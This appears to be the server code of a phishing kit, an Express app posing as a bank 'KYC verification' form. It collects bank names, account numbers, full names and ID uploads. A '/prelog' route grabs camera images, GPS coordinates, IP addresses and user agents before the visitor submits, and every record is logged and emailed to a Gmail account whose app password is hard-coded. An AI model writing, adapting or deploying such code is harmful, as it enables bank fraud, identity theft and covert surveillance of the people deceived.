// ✅ Final server.js with prelog support and improved IP detection
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json({ limit: '50mb' }));

// Ensure 'uploads' directory exists
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

// Setup multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads'),
  filename: (req, file, cb) =>
    cb(null, Date.now() + '-' + file.originalname.replace(/\s+/g, '_'))
});
const upload = multer({ storage }).any();

// Setup Nodemailer transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'kexmwnespcwxrkjt'  // ✅ no spaces
  }
});

// 🔁 Helper: Log and email
function logAndSendMail(subject, message, files = []) {
  const timestamp = new Date().toISOString();
  const logEntry = `--- ${subject} ---\n${timestamp}\n${message}\n\n`;
  fs.appendFileSync('records.txt', logEntry);
  console.log(logEntry);

  const attachments = files.map(file => ({
    filename: file.originalname,
    path: file.path
  }));

  transporter.sendMail({
    from: 'dcbsubmission392@gmail.com',
    to: 'dcbsubmission392@gmail.com',
    subject,
    text: message,
    attachments
  }, (error, info) => {
    if (error) {
      console.error('❌ Email failed:', error);
    } else {
      console.log('✅ Email sent:', info.response);
    }
    // Cleanup temp files
    attachments.forEach(att => {
      if (fs.existsSync(att.path)) fs.unlinkSync(att.path);
    });
  });
}

// ✅ Main form route
app.post('/submit', upload, (req, res) => {
  const { bankname, accno, fullname } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const file = req.files.find(f => f.fieldname === 'document');
  const timestamp = new Date().toISOString();

  const message = `Bank Name: ${bankname}\nAccount No: ${accno}\nFull Name: ${fullname}\nFile: ${file?.path || 'None'}\nIP: ${ip}\nUser Agent: ${userAgent}`;
  logAndSendMail('🔔 New Bank Verification Submission', message, file ? [file] : []);

  res.send('<h2>✅ Submitted Successfully!</h2><p>Your KYC info has been received.</p>');
});

// ✅ Pre-log route for camera + GPS data before submission
app.post('/prelog', upload, (req, res) => {
  const files = req.files || [];
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];

  let location = 'None';
  try {
    if (req.body.location) {
      const loc = JSON.parse(req.body.location);
      location = `Lat: ${loc.latitude}, Long: ${loc.longitude}, Acc: ±${loc.accuracy}m`;
    }
  } catch (e) {
    console.error('Location parse error:', e);
  }

  const message = `Early Data\nLocation: ${location}\nImages: ${files.length}\nIP: ${ip}\nUser Agent: ${userAgent}`;
  logAndSendMail('🔔 Pre-Submission Visitor Data', message, files);

  res.sendStatus(200);
});

// ✅ Start server
app.listen(port, () => console.log(`✅ Server running on port ${port}`));
